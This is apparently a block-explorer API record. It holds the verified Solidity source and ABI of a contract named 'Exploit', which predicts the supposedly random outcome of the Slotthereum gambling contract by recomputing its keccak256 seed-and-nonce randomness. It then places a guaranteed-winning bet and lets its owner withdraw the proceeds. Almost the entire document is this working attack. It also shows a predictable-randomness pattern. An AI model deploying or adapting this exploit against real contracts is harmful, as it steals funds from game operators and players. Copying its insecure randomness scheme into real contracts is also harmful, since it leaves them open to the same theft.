{"status":"1","message":"OK","result":[{"SourceCode":"// 109999999999999999 * 10 / 9 = x\r\n\r\ncontract Slotthereum {\r\n    function placeBet(uint8 start, uint8 end) public payable returns (bool) {\r\n    }\r\n}\r\n\r\ncontract Exploit {\r\n    address owner;\r\n    Slotthereum target;\r\n    bytes32 seed;\r\n    uint nonce;\r\n    \r\n    function Exploit() {\r\n        owner = msg.sender;\r\n    }\r\n    \r\n    function attack(address a, bytes32 s, uint n) payable {\r\n        Slotthereum target = Slotthereum(a);\r\n        seed = s;\r\n        nonce = n;\r\n        uint8 win = getNumber();\r\n        target.placeBet.value(msg.value)(win, win);\r\n    }\r\n    \r\n    function () payable {\r\n        \r\n    }\r\n    \r\n    function withdraw() {\r\n        require(msg.sender == owner);\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n    \r\n    function random(uint8 min, uint8 max) public returns (uint) {\r\n        nonce++;\r\n        return uint(keccak256(nonce, seed))%(min+max)-min;\r\n    }\r\n\r\n    function random8(uint8 min, uint8 max) public returns (uint8) {\r\n        nonce++;\r\n        return uint8(keccak256(nonce, seed))%(min+max)-min;\r\n    }\r\n\r\n    function newSeed() public {\r\n        seed = keccak256(nonce, seed, random(0, 255));\r\n    }\r\n\r\n    function getNumber() public returns (uint8) {\r\n        newSeed();\r\n        return random8(0,9);\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"min\",\"type\":\"uint8\"},{\"name\":\"max\",\"type\":\"uint8\"}],\"name\":\"random\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"min\",\"type\":\"uint8\"},{\"name\":\"max\",\"type\":\"uint8\"}],\"name\":\"random8\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"newSeed\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getNumber\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"a\",\"type\":\"address\"},{\"name\":\"s\",\"type\":\"bytes32\"},{\"name\":\"n\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Exploit","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://9f49fecaa5e534b25939ede5efcd8db9036d0dcaf9cc4ca0f798b8915466c3f2"}]}